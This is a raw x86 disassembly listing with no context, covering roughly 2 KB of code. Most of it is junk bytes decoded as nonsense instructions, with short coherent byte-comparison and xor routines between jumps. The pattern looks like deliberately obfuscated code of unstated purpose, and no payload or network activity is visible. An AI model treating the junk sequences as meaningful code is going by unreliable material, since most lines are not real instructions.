  407a2a:	cs push 0x1ea0d4b0
  407a30:	(bad)  
  407a31:	pusha  
  407a32:	aad    0x4
  407a34:	mov    ds:0x8ef78792,al
  407a39:	test   al,0xda
  407a3b:	sub    bl,BYTE PTR [ebx+0x75e2e0fc]
  407a41:	fmul   DWORD PTR [edx-0x45]
  407a44:	arpl   WORD PTR [ebp+0x77],si
  407a47:	sbb    eax,0x61eabddc
  407a4c:	daa    
  407a4d:	jge    0x407aa4
  407a4f:	xor    BYTE PTR [esi-0x158d1849],0x17
  407a56:	adc    eax,0xf67232f0
  407a5b:	jno    0x407ab1
  407a5d:	aaa    
  407a5e:	lahf   
  407a5f:	(bad)  [edi-0x53141a54]
  407a65:	xor    BYTE PTR [eax-0x30],0xfe
  407a69:	xchg   edi,eax
  407a6a:	cmp    eax,0x2d0f9cb0
  407a6f:	test   DWORD PTR [esi-0x7cee4388],ecx
  407a75:	mov    esi,0x4c4618d8
  407a7a:	jp     0x407a76
  407a7c:	stos   BYTE PTR es:[edi],al
  407a7d:	cmp    al,0x5a
  407a7f:	sahf   
  407a80:	inc    eax
  407a81:	push   edx
  407a82:	adc    BYTE PTR [edx+0x64],bl
  407a85:	in     eax,0x3d
  407a87:	hlt    
  407a88:	inc    BYTE PTR [esi]
  407a8a:	fwait
  407a8b:	jne    0x407b03
  407a8d:	int    0x74
  407a8f:	jae    0x407a27
  407a91:	es jo  0x407a89
  407a94:	adc    esi,DWORD PTR [eax]
  407a96:	aas    
  407a97:	into   
  407a98:	nop
  407a99:	dec    eax
  407a9a:	jg     0x407a3c
  407a9c:	mov    BYTE PTR [ebp-0x1d2812ae],0x5a
  407aa3:	sbb    BYTE PTR [eax],al
  407aa5:	xor    cl,dh
  407aa7:	loop   0x407b20
  407aa9:	je     0x407a73
  407aab:	jmp    0x1c58:0x11e96025
  407ab2:	mov    bh,0x21
  407ab4:	std    
  407ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ab6:	pop    ecx
  407ab7:	sbb    DWORD PTR ds:0x55cef32d,0x8c45b076
  407ac1:	fs jae 0x407b17
  407ac4:	fidivr DWORD PTR [ebx+0x2c30a554]
  407aca:	(bad)  
  407acb:	rcr    BYTE PTR [ecx+0x75],1
  407ace:	push   es
  407acf:	imul   ebx,DWORD PTR [edx+0x24],0xffffff98
  407ad3:	jae    0x407b47
  407ad5:	rcr    BYTE PTR [edi],cl
  407ad7:	or     eax,0x6149190
  407adc:	pop    ds
  407add:	cmp    esp,DWORD PTR [ebx-0x57]
  407ae0:	mov    eax,0x162479d5
  407ae5:	xrelease xchg DWORD PTR [edi],edi
  407ae8:	and    esp,edx
  407aea:	scas   eax,DWORD PTR es:[edi]
  407aeb:	mov    eax,ds:0x4d7b7f1c
  407af0:	sub    eax,0x8f944f65
  407af5:	jmp    0xfb21b442
  407afa:	push   esp
  407afb:	scas   al,BYTE PTR es:[edi]
  407afc:	hlt    
  407afd:	add    al,0x49
  407aff:	pop    edx
  407b00:	inc    ebx
  407b01:	xlat   BYTE PTR ds:[ebx]
  407b02:	lods   eax,DWORD PTR ds:[esi]
  407b03:	in     eax,0xaa
  407b05:	test   eax,0x3a9e01e4
  407b0a:	or     eax,0x67d99851
  407b0f:	pusha  
  407b10:	xor    bl,BYTE PTR [edx+0x4a59a514]
  407b16:	add    BYTE PTR [ebx-0x48f0f7bb],cl
  407b1c:	add    al,0x90
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	repz inc edx
  407b4d:	shl    edx,cl
  407b4f:	jge    0x407b16
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407af4
  407b58:	daa    
  407b59:	rcr    DWORD PTR [ebx],1
  407b5b:	call   FWORD PTR [esi-0x7b]
  407b5e:	ins    DWORD PTR es:[edi],dx
  407b5f:	sbb    DWORD PTR [edx-0x4e9e1c66],edi
  407b65:	mov    DWORD PTR [eax+0x9bf541],0x4a508d1c
  407b6f:	or     ecx,DWORD PTR [ebx+0x666d54f5]
  407b75:	scas   eax,DWORD PTR es:[edi]
  407b76:	jo     0x407b2d
  407b78:	jo     0x407bd0
  407b7a:	imul   edi,ebx,0xee10ad7
  407b80:	out    0xb3,eax
  407b82:	and    edx,DWORD PTR ds:0x3628da50
  407b88:	jns    0x407b65
  407b8a:	jecxz  0x407bba
  407b8c:	lds    edx,FWORD PTR [esi-0x231ba6c4]
  407b92:	jno    0x407b78
  407b94:	push   0x2abad981
  407b99:	into   
  407b9a:	icebp  
  407b9b:	mov    ecx,0x76108369
  407ba0:	cmp    al,0x10
  407ba2:	dec    ebp
  407ba3:	(bad)  
  407ba4:	cwde   
  407ba5:	jmp    0x55ab4e8a
  407baa:	aam    0x3f
  407bac:	sbb    DWORD PTR [ebx],0x40
  407baf:	out    0xb3,eax
  407bb1:	pop    ss
  407bb2:	popa   
  407bb3:	cdq    
  407bb4:	push   0x50fe0840
  407bb9:	push   ss
  407bba:	mov    ah,0x39
  407bbc:	add    ebp,eax
  407bbe:	je     0x407b89
  407bc0:	cmp    edi,DWORD PTR [edi+0x2e]
  407bc3:	jo     0x407bdc
  407bc5:	fnstsw WORD PTR [ebx]
  407bc7:	mov    BYTE PTR [ecx+ecx*1-0x20],al
  407bcb:	call   0xf0cc:0xdbe55692
  407bd2:	in     al,dx
  407bd3:	add    BYTE PTR [esi],al
  407bd5:	add    BYTE PTR [ebx-0x49],0xdf
  407bd9:	fwait
  407bda:	jae    0x407c22
  407bdc:	mov    al,0x49
  407bde:	pmulhw mm0,QWORD PTR [edx-0x21]
  407be2:	cmp    ch,ah
  407be4:	jne    0x407b70
  407be6:	and    eax,0x52075888
  407beb:	aaa    
  407bec:	loopne 0x407bcc
  407bee:	fwait
  407bef:	lods   eax,DWORD PTR ds:[esi]
  407bf0:	dec    eax
  407bf1:	ret    0x74b7
  407bf4:	push   esi
  407bf5:	enter  0xa9ea,0xed
  407bf9:	ins    DWORD PTR es:[edi],dx
  407bfa:	sbb    al,BYTE PTR [eax-0x1eb18e9c]
  407c00:	push   ebx
  407c01:	xor    cl,BYTE PTR [ebx+0xfc6b617]
  407c07:	cli    
  407c08:	out    dx,eax
  407c09:	rcl    DWORD PTR [esi],1
  407c0b:	psubsb mm4,QWORD PTR [ecx-0x2b]
  407c0f:	bndldx (bad),ds:0xe00fc154
  407c16:	cli    
  407c17:	test   al,0x4f
  407c19:	pushf  
  407c1a:	stc    
  407c1b:	or     dl,BYTE PTR [edx+0x159e97ad]
  407c21:	jns    0x407c27
  407c23:	mov    bl,0x8a
  407c25:	cmp    al,0xa0
  407c27:	push   esi
  407c28:	iret   
  407c29:	inc    eax
  407c2a:	jg     0x407c1c
  407c2c:	mov    ch,0x3a
  407c2e:	sbb    DWORD PTR [esi+0x3f1a4b1a],ebx
  407c34:	mov    eax,ds:0xcf32cf
  407c39:	ja     0x407c61
  407c3b:	add    BYTE PTR [edx-0x57e5671],bl
  407c41:	add    BYTE PTR [ebx+ebp*1-0x61],bl
  407c45:	mov    ecx,0x5540ceaa
  407c4a:	pop    ebp
  407c4b:	sub    BYTE PTR [eax-0x3a],ch
  407c4e:	mov    edi,0xbd63e810
  407c53:	jl     0x407c07
  407c55:	sbb    ebp,DWORD PTR [ebx-0x291c2d88]
  407c5b:	push   es
  407c5c:	push   ss
  407c5d:	sar    DWORD PTR ds:0x22b54132,1
  407c63:	out    dx,eax
  407c64:	jp     0x407ca1
  407c66:	sub    BYTE PTR [edx+0x3e2efa96],dl
  407c6c:	pop    edx
  407c6d:	mov    esi,0xa652ad2b
  407c72:	ror    ebp,cl
  407c74:	inc    edx
  407c75:	fldcw  WORD PTR [edx]
  407c77:	xor    al,0x36
  407c79:	pop    ds
  407c7a:	mov    ebp,0x90bb06ab
  407c7f:	fcom   QWORD PTR [eax+0xd456a88]
  407c85:	or     BYTE PTR [ebx*1-0xb6dadb3],cl
  407c8c:	gs jg  0x407c1f
  407c8f:	in     eax,0xe1
  407c91:	gs jecxz 0x407cd5
  407c94:	mov    eax,ds:0xf8f83672
  407c99:	add    BYTE PTR [ebp+ebp*1-0x4e],al
  407c9d:	js     0x407c55
  407c9f:	and    ebx,DWORD PTR [esi]
  407ca1:	pop    ebp
  407ca2:	pop    ebx
  407ca3:	xor    eax,0x661ebcda
  407ca8:	test   eax,0x79a427db
  407cad:	dec    edi
  407cae:	mov    al,0x12
  407cb0:	sub    esi,0x8b745ecc
  407cb6:	rcl    DWORD PTR [edi-0x60],0x14
  407cba:	mov    al,0x8b
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	or     al,0xe8
  407ce1:	and    cl,BYTE PTR [ebp-0x2f]
  407ce4:	(bad)  
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407cb6
  407cec:	xchg   edi,eax
  407ced:	mov    ah,0xee
  407cef:	loope  0x407c8d
  407cf1:	pop    ds
  407cf2:	add    ecx,DWORD PTR [edi]
  407cf4:	test   DWORD PTR [ebp-0x42],edi
  407cf7:	or     ebx,DWORD PTR [ecx-0x50b98ebf]
  407cfd:	push   edi
  407cfe:	pushf  
  407cff:	sub    bl,BYTE PTR [ebx+0x57e2688e]
  407d05:	into   
  407d06:	scas   al,BYTE PTR es:[edi]
  407d07:	sub    bl,dl
  407d09:	out    dx,al
  407d0a:	cmp    eax,DWORD PTR [ebp+0x8ea18f3]
  407d10:	pop    edx
  407d11:	or     DWORD PTR [esi],0x19
  407d14:	fwait
  407d15:	or     esi,DWORD PTR ds:0xf1c3c0f
  407d1b:	push   cs
  407d1c:	jg     0x407cd6
  407d1e:	(bad)  
  407d1f:	js     0x407d36
  407d21:	xchg   BYTE PTR [ecx-0x72],ch
  407d24:	adc    DWORD PTR ds:0x805c9400,ebx
  407d2a:	mov    dh,0xdb
  407d2c:	mov    eax,ds:0xd1e87427
  407d31:	hlt    
  407d32:	sub    BYTE PTR [ecx+eax*1-0x14],dh
  407d36:	retf   0xafd8
  407d39:	cmp    ecx,DWORD PTR [eax-0x2aa38eb1]
  407d3f:	out    dx,eax
  407d40:	cmc    
  407d41:	lock inc eax
  407d43:	rcr    ecx,1
  407d45:	fs sub esp,ebp
  407d48:	std    
  407d49:	jmp    0x2fc6:0x770b3fbc
  407d50:	stc    
  407d51:	cmp    al,BYTE PTR ds:0xbfac2139
  407d57:	add    al,0x8b
  407d59:	in     eax,dx
  407d5a:	je     0x407d7b
  407d5c:	(bad)  
  407d5d:	out    dx,al
  407d5e:	adc    BYTE PTR [eax+0x2a5ce4d4],ah
  407d64:	mov    esi,0xb1e4311f
  407d69:	ins    DWORD PTR es:[edi],dx
  407d6a:	in     al,0x32
  407d6c:	add    al,0xf4
  407d6e:	cmc    
  407d6f:	aaa    
  407d70:	es or  al,0x3a
  407d73:	push   es
  407d74:	cmc    
  407d75:	scas   eax,DWORD PTR es:[edi]
  407d76:	inc    esp
  407d77:	sub    eax,0x4a8d5304
  407d7c:	push   0x98552a82
  407d81:	xor    dl,BYTE PTR [ebx]
  407d83:	in     al,0xa7
  407d85:	lahf   
  407d86:	dec    esp
  407d87:	add    ecx,esp
  407d89:	out    0xac,eax
  407d8b:	xlat   BYTE PTR ds:[ebx]
  407d8c:	inc    eax
  407d8d:	inc    ebp
  407d8e:	test   BYTE PTR [ecx+0x5e],0x95
  407d92:	xor    eax,0x903da6c0
  407d97:	push   edx
  407d98:	cmc    
  407d99:	cmp    eax,0x16a0295
  407d9e:	dec    eax
  407d9f:	adc    esp,DWORD PTR [edi-0x3df635b8]
  407da5:	cwde   
  407da6:	push   ebx
  407da7:	sub    bl,bl
  407da9:	dec    esi
  407daa:	rol    DWORD PTR [eax],1
  407dac:	xchg   esp,eax
  407dad:	jno    0x407d9a
  407daf:	or     al,0x9a
  407db1:	std    
  407db2:	jnp    0x407d70
  407db4:	jmp    0x37bf9125
  407db9:	xchg   DWORD PTR [ebp-0x4fdc16f9],edx
  407dbf:	ins    BYTE PTR es:[edi],dx
  407dc0:	loopne 0x407da8
  407dc2:	arpl   WORD PTR [esi-0x64],cx
  407dc5:	xchg   ebp,eax
  407dc6:	iret   
  407dc7:	sub    ecx,DWORD PTR [esi+0x5f95319d]
  407dcd:	retf   
  407dce:	mov    ?,edi
  407dd0:	mov    ecx,0x285b626c
  407dd5:	dec    bh
  407dd7:	mov    dl,0x50
  407dd9:	pop    edi
  407dda:	repz jae 0x407e20
  407ddd:	add    bh,al
  407ddf:	mov    al,0x59
  407de1:	push   edi
  407de2:	add    BYTE PTR [edx-0x64],0x7
  407de6:	std    
  407de7:	pop    edx
  407de8:	cmp    DWORD PTR [edi+0x22],ebx
  407deb:	or     al,0xb8
  407ded:	shr    BYTE PTR [edi+0xa5fe989],0x3a
  407df4:	fldcw  WORD PTR [ecx]
  407df6:	jge    0x407e2d
  407df8:	test   al,0xd3
  407dfa:	jns    0x407e4e
  407dfc:	fmul   QWORD PTR [edi-0x29]
  407dff:	fcmovbe st,st(0)
  407e01:	retf   
  407e02:	gs jecxz 0x407ddd
  407e05:	lods   eax,DWORD PTR ds:[esi]
  407e06:	jbe    0x407def
  407e08:	adc    bh,BYTE PTR [eax]
  407e0a:	dec    esp
  407e0b:	cmp    BYTE PTR [esi-0x72],al
  407e0e:	ret    0x5c84
  407e11:	(bad)  
  407e14:	mov    edx,0x91d4d116
  407e19:	enter  0x352c,0x31
  407e1d:	adc    eax,0x38a94d3d
  407e22:	cmp    BYTE PTR [esi-0xab44280],ah
  407e28:	daa    
  407e29:	lods   al,BYTE PTR ds:[esi]
  407e2a:	pop    edi
  407e2b:	retf   0x790
  407e2e:	cmp    esp,edi
  407e30:	test   DWORD PTR [ecx-0x2978f864],0x306f7143
  407e3a:	cli    
  407e3b:	add    eax,0x85629077
  407e40:	sbb    eax,0xdeee6c6
  407e45:	xchg   BYTE PTR [edx-0x4d9e5285],cl
  407e4b:	adc    BYTE PTR [ecx+0x5c],ah
  407e4e:	dec    ebx
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0xd5
  407ea7:	dec    ecx
  407ea8:	jmp    0x7f1933b1
  407ead:	jle    0x407e81
  407eaf:	jg     0x407f2f
  407eb1:	jle    0x407e65
  407eb3:	jnp    0x407ee3
  407eb5:	leave  
  407eb6:	retf   0x70d
  407eb9:	add    eax,ebp
  407ebb:	clc    
  407ebc:	fwait
  407ebd:	xchg   ebp,eax
  407ebe:	add    al,bh
  407ec0:	and    DWORD PTR [ebx+0x54],0x1b38e85e
  407ec7:	aam    0x58
  407ec9:	adc    al,0xe4
  407ecb:	cmc    
  407ecc:	aaa    
  407ecd:	mov    ds,WORD PTR [edx+0x45ee6958]
  407ed3:	jg     0x407ec0
  407ed5:	xchg   ebx,eax
  407ed6:	inc    edi
  407ed7:	or     eax,0xcb50a97d
  407edc:	les    eax,FWORD PTR [ebx]
  407ede:	pop    ds
  407edf:	cmp    al,0x21
  407ee1:	or     bh,BYTE PTR [esp+edi*2-0xe]
  407ee5:	fdivp  st(2),st
  407ee7:	mov    esp,DWORD PTR [ebx]
  407ee9:	nop
  407eea:	pop    ecx
  407eeb:	or     cl,dh
  407eed:	pop    eax
  407eee:	shl    DWORD PTR [ebp+0x19],1
  407ef1:	and    BYTE PTR [ecx+0x6155d21d],0xc4
  407ef8:	leave  
  407ef9:	loope  0x407f1f
  407efb:	in     eax,dx
  407efc:	mov    ebp,0x230f24bb
  407f01:	adc    al,0xf5
  407f03:	fsub   QWORD PTR [ecx+0x4f]
  407f06:	outs   dx,BYTE PTR ds:[esi]
  407f07:	dec    ebx
  407f08:	aad    0x59
  407f0a:	shl    DWORD PTR [ebx+0x69],cl
  407f0d:	in     al,dx
  407f0e:	mov    al,0x3b
  407f10:	xchg   ecx,eax
  407f11:	dec    edi
  407f12:	pop    ds
  407f13:	sub    BYTE PTR [edi+0x2fa1f852],dl
  407f19:	jp     0x407f7c
  407f1b:	lds    eax,FWORD PTR [edi+0x6c]
  407f1e:	add    al,0xe
  407f20:	pop    esi
  407f21:	(bad)
  407f25:	sti    
  407f26:	loop   0x407ef7
  407f28:	lahf   
  407f29:	mov    bh,0x2f
  407f2b:	pusha  
  407f2c:	in     al,dx
  407f2d:	mov    eax,DWORD PTR [esi+0x15]
  407f30:	pop    ss
  407f31:	es mov ebx,0x88261e6b
  407f37:	test   DWORD PTR [eax-0x8],ebp
  407f3a:	adc    bh,BYTE PTR [ecx-0x7e]
  407f3d:	lds    ebp,FWORD PTR [ebx-0x7fbb0abf]
  407f43:	shl    DWORD PTR [ebx],cl
  407f45:	jmp    0x407f91
  407f47:	jl     0x407f9c
  407f49:	jns    0x407f05
  407f4b:	in     eax,0x2f
  407f4d:	cmp    cl,BYTE PTR [esi+0x546899a1]
  407f53:	call   0xdb8b:0xe591876e
  407f5a:	or     esp,esi
  407f5c:	or     BYTE PTR [edi-0x4c1cdfb7],0x29
  407f63:	pop    es
  407f64:	outs   dx,BYTE PTR ds:[esi]
  407f65:	imul   edx,DWORD PTR [esi+ecx*8-0x15],0x89e60cbb
  407f6d:	imul   esi,DWORD PTR [eax+0x4e],0xd37b8967
  407f74:	mov    bl,0x21
  407f76:	outs   dx,BYTE PTR ds:[esi]
  407f77:	and    al,0xfb
  407f79:	popf   
  407f7a:	push   esi
  407f7b:	outs   dx,DWORD PTR ds:[esi]
  407f7c:	push   cs
  407f7d:	inc    esi
  407f7e:	(bad)  
  407f7f:	test   eax,0x2bba2657
  407f84:	xor    ebx,DWORD PTR [edx]
  407f86:	push   esp
  407f87:	and    BYTE PTR [ecx+0x3cddbf1c],al
  407f8d:	ret    
  407f8e:	lahf   
  407f8f:	mov    ebp,cs
  407f91:	(bad)  
  407f94:	lea    esp,[eax+0x24e6f90]
  407f9a:	ss cmc 
  407f9c:	ret    
  407f9d:	cmp    BYTE PTR [ecx+0x56eb6be2],al
  407fa3:	fisubr DWORD PTR [ebp-0x7841e1c8]
  407fa9:	leave  
  407faa:	cmp    ch,ch
  407fac:	or     ebp,ebx
  407fae:	sbb    al,0x6c
  407fb0:	outs   dx,BYTE PTR ds:[esi]
  407fb1:	mov    WORD PTR [esp+ebp*4-0x49],?
  407fb5:	xor    ch,BYTE PTR [ecx+esi*4-0x69e39eab]
  407fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fbd:	adc    DWORD PTR [ebx],ecx
  407fbf:	std    
  407fc0:	dec    ebp
  407fc1:	sbb    ah,BYTE PTR [edx+ecx*2+0x3d]
  407fc5:	js     0x408045
  407fc7:	jne    0x407f81
  407fc9:	dec    edi
  407fca:	or     BYTE PTR [ecx],al
  407fcc:	adc    al,0x7a
  407fce:	xor    eax,0xa1d0412
  407fd3:	lea    ebx,[eax-0x40]
  407fd6:	push   ebx
  407fd7:	(bad)  
  407fd9:	xchg   edx,edx
  407fdb:	ins    BYTE PTR es:[edi],dx
  407fdc:	push   esi
  407fdd:	fimul  DWORD PTR [edi+ebp*2]
  407fe0:	(bad)  
  407fe1:	sbb    al,0x2
  407fe3:	js     0x408046
  407fe5:	sub    eax,0x78286b18
  407fea:	inc    esp
  407feb:	(bad)  
  407fec:	cmp    eax,0x5c868750
  407ff1:	cs dec esi
  407ff3:	cld    
  407ff4:	out    0xaf,eax
  407ff6:	(bad)
  407ff9:	pop    ds
  407ffa:	icebp  
  407ffb:	fdiv   DWORD PTR [edi]
  407ffd:	bound  edi,QWORD PTR [edi-0x61]
  408000:	inc    esp
  408001:	icebp  
  408002:	(bad)  
  408003:	neg    BYTE PTR [edi-0x3f8ff4b3]
  408009:	mov    DWORD PTR [ecx],edx
  40800b:	jae    0x408080
  40800d:	aad    0x9e
  40800f:	shl    DWORD PTR [ebx+0x7e802ebc],0xc5
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x13d49f1a],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x40806d
  408040:	mov    edi,0x59c65ed3
  408045:	repz not BYTE PTR [edx]
  408048:	push   eax
  408049:	mov    ds:0x163030e1,eax
  40804e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40804f:	enter  0x74ed,0x3f
  408053:	mov    BYTE PTR [eax-0x79],al
  408056:	mov    al,0x16
  408058:	mov    ebp,0x4b1200d7
  40805d:	and    al,0xf7
  40805f:	jmp    0x6f99:0xc628a562
  408066:	pop    ss
  408067:	retf   
  408068:	mov    esp,0xa77737b8
  40806d:	inc    esi
  40806e:	fbstp  TBYTE PTR [edx+0x4a]
  408071:	xchg   edi,eax
  408072:	clc    
  408073:	push   ebx
  408074:	sub    al,0x24
  408076:	js     0x408004
  408078:	pop    esi
  408079:	into   
  40807a:	dec    ebp
  40807b:	xor    dl,BYTE PTR [esi+0x67]
  40807e:	repz mov bh,0x51
  408081:	es sub al,0x64
  408084:	test   DWORD PTR [edi+0x49511b3e],eax
  40808a:	aaa    
  40808b:	push   esi
  40808c:	adc    dl,BYTE PTR [edx]
  40808e:	sbb    DWORD PTR [ecx],eax
  408090:	xor    DWORD PTR [edx],edi
  408092:	(bad)  
  408093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408094:	outs   dx,DWORD PTR ds:[esi]
  408095:	sub    edi,esp
  408097:	sbb    eax,0x54d70e15
  40809c:	and    eax,0xd7bf7070
  4080a1:	in     al,0xea
  4080a3:	and    DWORD PTR [ecx],esi
  4080a5:	pop    ebx
  4080a6:	popf   
  4080a7:	pop    ebp
  4080a8:	push   ebp
  4080a9:	mov    DWORD PTR [ebx+0x5e],0x8157acf8
  4080b0:	ja     0x4080cc
  4080b2:	retf   0x30f3
  4080b5:	pop    edi
  4080b6:	lods   eax,DWORD PTR ds:[esi]
  4080b7:	jl     0x40811b
  4080b9:	jb     0x40805d
  4080bb:	dec    ecx
  4080bc:	mov    ebp,0x76e9a03f
  4080c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080c2:	add    eax,0x5a0cb8d2
  4080c7:	nop
  4080c8:	jmp    0xe45533d3
  4080cd:	mov    dl,0x88
  4080cf:	loopne 0x4080ee
  4080d1:	push   eax
  4080d2:	rol    BYTE PTR [ecx+ebp*4-0x50],cl
  4080d6:	(bad)  
  4080d7:	retf   
  4080d8:	in     al,0xc8
  4080da:	call   0x8a0f7e8
  4080df:	retf   
  4080e0:	into   
  4080e1:	xor    edx,edi
  4080e3:	jmp    0xab4a6204
  4080e8:	push   es
  4080e9:	or     al,0xc
  4080eb:	mov    ecx,0xa96bb63
  4080f0:	lock data16 in al,0xf3
  4080f4:	inc    ecx
  4080f5:	pop    DWORD PTR [edi-0x5b]
  4080f8:	(bad)  
  4080f9:	cmc    
  4080fa:	sbb    esp,DWORD PTR [esi+0x30702962]
  408100:	and    BYTE PTR [edi],ah
  408102:	xchg   ebx,eax
  408103:	outs   dx,DWORD PTR ds:[si]
  408105:	js     0x408133
  408107:	addr16 mov bh,0xed
  40810a:	or     DWORD PTR [eax],edx
  40810c:	cmp    edi,DWORD PTR [ebp-0x17d263c7]
  408112:	xchg   esi,eax
  408113:	jmp    0x408190
  408115:	xor    eax,0x82357379
  40811a:	cmp    eax,0x8267eb94
  40811f:	popf   
  408120:	adc    BYTE PTR ss:[edi-0x63],bh
  408124:	add    DWORD PTR [esi-0xd],ebx
  408127:	aad    0x3d
  408129:	sbb    DWORD PTR [eax],ecx
  40812b:	xor    BYTE PTR [eax],ch
  40812d:	mov    WORD PTR [eax-0x5f],ds
  408130:	lods   eax,DWORD PTR ds:[esi]
  408131:	mov    ?,WORD PTR [edi-0x636dcd9a]
  408137:	inc    esi
  408138:	int3   
  408139:	sbb    ecx,DWORD PTR [ecx+ecx*8+0x32]
  40813d:	enter  0x5ead,0x7a
  408141:	mov    bl,BYTE PTR [ecx]
  408143:	sub    ebx,DWORD PTR [esi]
  408145:	stos   DWORD PTR es:[edi],eax
  408146:	test   eax,0x663ebae6
  40814b:	(bad)  
  40814c:	fnstenv [eax]
  40814e:	into   
  40814f:	sub    DWORD PTR [edx],esi
  408151:	leave  
  408152:	addr16 mov ds:0xd41e,eax
  408156:	inc    edi
  408157:	mov    ah,0xc6
  408159:	or     DWORD PTR [esi+0x5f],eax
  40815c:	dec    esp
  40815d:	nop
  40815e:	inc    ebp
  40815f:	loopne 0x408136
  408161:	fidivr WORD PTR [edi+0x36]
  408164:	div    DWORD PTR [ecx+ebx*2]
  408167:	les    ebp,FWORD PTR [edi+0x56]
  40816a:	add    dl,BYTE PTR [eax]
  40816c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40816d:	mov    eax,0x80ac8130
  408172:	push   0x61b31d2
  408177:	pop    ds
  408178:	mov    eax,0xf0f783fd
  40817d:	pushf  
  40817e:	fwait
  40817f:	rcr    BYTE PTR [edi],cl
  408181:	(bad)  
  408182:	cmp    cl,BYTE PTR [ecx]
  408184:	outs   dx,BYTE PTR ds:[esi]
  408185:	adc    bh,BYTE PTR [edx-0x1e986c2f]
  40818b:	jae    0x408116
  40818d:	cmc    
  40818e:	out    dx,eax
  40818f:	not    DWORD PTR [edx]
  408191:	(bad)  
  408192:	jg     0x408130
  408194:	or     BYTE PTR [edi-0x7d246c9b],al
  40819a:	rol    DWORD PTR [ebp+eiz*1-0x4e],1
  40819e:	rcl    bl,1
  4081a0:	sub    dh,BYTE PTR [eax+0x11]
  4081a3:	mov    eax,DWORD PTR [ebp-0x10]
  4081a6:	mov    edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0xa08d871]
  4081bf:	addr16 (bad) 
  4081c1:	fstp   TBYTE PTR [esi+0x7e]
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x40814b
  4081c9:	add    eax,0x2313bde0
  4081ce:	sbb    DWORD PTR [eax],edi
  4081d0:	lods   al,BYTE PTR ds:[esi]
  4081d1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4081d3:	adc    esp,0xfb9ece7d
  4081d9:	rol    ecx,0xf7
  4081dc:	sub    al,0x7d
  4081de:	stos   DWORD PTR es:[edi],eax
  4081df:	lods   eax,DWORD PTR ds:[esi]
  4081e0:	call   0x83442e50
  4081e5:	repnz (bad) [ecx]
  4081e8:	push   cs
  4081e9:	mov    cl,0xf8
  4081eb:	les    edx,FWORD PTR [edx+0x6a]
  4081ee:	jmp    0x8c4:0x57a4c886
  4081f5:	test   cl,al
  4081f7:	cmp    eax,0xcf53e75
  4081fc:	mov    bl,0xf1
  4081fe:	xor    ch,BYTE PTR ds:0xb8c47b8b
  408204:	inc    esi
  408205:	(bad)  
  408207:	or     bh,BYTE PTR [edx+0x7c]
  40820a:	cmp    BYTE PTR [edi-0x1],bl
  40820d:	cmp    BYTE PTR [edx-0x2207d4b9],ah
  408213:	adc    bh,al
  408215:	adc    DWORD PTR [ebp+0x7d7344cc],esp
  40821b:	inc    edi
  40821c:	stc    
